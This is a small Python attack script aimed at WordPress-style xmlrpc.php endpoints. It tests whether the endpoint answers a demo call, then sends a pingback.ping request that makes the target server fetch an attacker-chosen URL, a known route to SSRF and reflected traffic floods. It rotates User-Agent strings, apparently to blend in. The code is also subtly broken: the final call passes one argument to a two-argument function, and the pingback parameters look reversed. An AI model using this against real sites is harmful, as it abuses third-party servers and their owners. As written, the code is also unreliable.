#!/usr/bin/env python -f
import urllib3
import re
from urllib.parse import urlsplit
from random import choice

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_base_url(url: str) -> str:
    return "{0.scheme}://{0.netloc}/".format(urlsplit(url))


def xmlrpc_demo_sayHello() -> str:
    return """<?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>demo.sayHello</methodName> 
    <params></params> 
    </methodCall>"""


def xmlrpc_demo_addTwoNumbers(number1: int = 1, number2: int = 1) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>demo.addTwoNumbers</methodName> 
    <params><value>{number1}</value><value>{number2}</value></params> 
    </methodCall>"""


def xmlrpc_pingback(target: str, receiver: str):
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
    <param>
    <value><string>{receiver}</string></value>
    </param>
    <param>
    <value><string>{target}</string></value>
    </param>
    </params>
    </methodCall>"""

    response = send_xmlrpc_post_request(target, body)


def send_xmlrpc_post_request(url: str, body: str):
    url = f"{get_base_url(url)}xmlrpc.php"
    http = urllib3.PoolManager(num_pools=2)

    return http.request('POST', url, body=body, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        "Accept": 'application/xml, text/xml',
        "User-Agent": random_user_agent()})


def random_user_agent() -> str:
    return choice(["Presto/2.12.388 Version/12.11",
                   "Presto/2.9.176 Version/11.00",
                   "Presto/2.7.62 Version/11.01 IABrowser36864557ba0",
                   "Presto/2.12.388 Version/12.15",
                   "Presto/2.5.24 Version/10.53",
                   "X11; Linux x86_64; kok-IN Presto/2.9.189 Version/11.00"
                   ])


def check_xmlrpc_is_open(url: str):
    http = urllib3.PoolManager(num_pools=2)

    print(f"[+] Checking url {url} is open via GET request...")

    # response = http.request('GET', url)

    # if response.status == 405 and response.data == b'XML-RPC server accepts POST requests only.':
    #     return True
    # else:
    print(
        f"[+] Trying alternative with POST request...")

    response = send_xmlrpc_post_request(url, xmlrpc_demo_sayHello())

    return response.status in [200, 201] and re.search('hello!', response.data.decode('utf-8'),  re.IGNORECASE)


if __name__ == '__main__':
    # url = f"{get_base_url(url)}xmlrpc.php"

    target = "https://example.com/xmlrpc.php"
    if check_xmlrpc_is_open(target):
        xmlrpc_pingback(target)
    else:
        print("xmlrpc not vulnerable")
